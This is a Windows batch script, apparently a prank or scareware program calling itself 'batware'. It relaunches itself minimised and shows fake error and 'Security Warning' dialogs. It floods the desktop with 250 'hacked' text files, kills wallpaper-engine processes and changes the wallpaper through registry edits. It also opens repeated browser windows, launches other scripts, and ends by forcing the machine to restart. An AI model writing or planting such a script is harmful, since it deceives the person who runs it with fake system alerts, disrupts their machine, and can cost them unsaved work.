@echo off

if not "%1"=="min" start "" /min cmd /c "%~f0" min & exit

title you shouldnt have done that
echo MsgBox "There was an error launching program", 16, "ERROR" > msg.vbs
cscript //nologo msg.vbs
del msg.vbs
timeout /t 5 >nul

start "" /b cmd /c "%~dp0songloop.bat"
start "" "%~dp0bounce.bat"

for /L %%i in (1,1,250) do (
echo you shouldnt have done that > %USERPROFILE%\Desktop\hacked%%i.txt
)

taskkill /f /im wallpaper32.exe >nul 2>&1
taskkill /f /im wallpaper64.exe >nul 2>&1
taskkill /f /im wallpaperengine.exe >nul 2>&1

timeout /t 5
set "img=%~dp0wallpaper.jpg"
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%img%" /f
reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 10 /f
reg add "HKCU\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d 0 /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters 1, True

timeout /t 1 >nul
start "" "https://google.com/search?q=you+shouldnt+have+done+that"
timeout /t 5 >nul
start "" "https://google.com/search?q=you+shouldnt+have+done+that"
timeout /t 5 >nul
start "" "https://google.com/search?q=you+shouldnt+have+done+that"
timeout /t 5 >nul
start "" "https://google.com/search?q=you+shouldnt+have+done+that"
timeout /t 5 >nul
start "" "https://google.com/search?q=you+shouldnt+have+done+that"

start "" "image.webp"

start "" "%~dp0bounce.bat"
timeout /t 2 >nul
start "" "%~dp0bounce.bat"

timeout /t 5
echo you shouldnt have done that > note.txt
notepad note.txt
del note.txt

timeout /t 5 >nul
echo MsgBox "Unauthorized changes detected in system settings.", 16, "Security Warning" > msg.vbs
cscript //nologo msg.vbs
del msg.vbs

start "" "image.webp"

start "" "%~dp0bounce.bat"
timeout /t 2 >nul
start "" "%~dp0bounce.bat"
timeout /t 2 >nul
start "" "%~dp0bounce.bat"
timeout /t 2 >nul

echo MsgBox "you shouldnt have done that", 48, "batware" > msg.vbs
cscript //nologo msg.vbs
del msg.vbs

reg add "HKCU\Control Panel\Desktop" /v Wallpaper /d "%original%" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
del %USERPROFILE%\Desktop\hacked*.txt
timeout /t 5 >nul
shutdown -r